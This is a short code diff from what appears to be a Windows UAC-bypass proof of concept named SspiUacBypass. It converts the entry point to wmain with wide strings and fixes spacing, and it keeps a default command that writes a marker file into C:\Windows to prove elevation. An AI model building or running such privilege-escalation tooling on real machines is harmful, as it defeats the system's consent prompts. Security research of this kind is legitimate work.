@@ -14,10 +14,10 @@ HANDLE ForgeNetworkAuthToken();
 void CheckTokenSession(HANDLE hToken);
 BOOL IsThreadTokenIdentification();
 
-int main(int argc, char* argv[]) 
+int wmain(int argc, wchar_t* argv[])
 {
-	char defaultCmdline[] = "cmd /c \"echo SspiUacBypass > C:\\Windows\\bypassuac.txt\"";
-	char* cmdline = defaultCmdline;
+	wchar_t defaultCmdline[] = L"cmd /c \"echo SspiUacBypass > C:\\Windows\\bypassuac.txt\"";
+	wchar_t* cmdline = defaultCmdline;
 	HANDLE hNetworkToken = INVALID_HANDLE_VALUE;
 
 	if (argc > 1)
@@ -141,7 +141,7 @@ BOOL IsThreadTokenIdentification() {
 	HANDLE hTokenImp;
 	SECURITY_IMPERSONATION_LEVEL impLevel;
 	DWORD retLenght = 0;
-	if(!OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hTokenImp)) {
+	if (!OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hTokenImp)) {
 		printf("OpenThreadToken failed with error code %d \n", GetLastError());
 		exit(-1);
 	}
